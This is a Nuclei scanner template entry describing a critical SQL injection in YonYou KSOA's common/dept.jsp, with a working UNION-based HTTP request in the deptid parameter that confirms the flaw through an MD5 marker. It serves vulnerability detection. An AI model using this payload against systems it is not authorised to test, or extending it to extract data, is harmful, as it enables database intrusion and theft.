# Nuclei Template: YonYou KSOA common/dept.jsp - SQL injection
**Template ID:** yonyou-ksoa-dept-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`yonyou-ksoa-dept-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Yonyou KSOA contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'{{num}}'))--+
```

## References
- https://mp.weixin.qq.com/s/I6aG2vFIi5nbVZfuVNpyDw
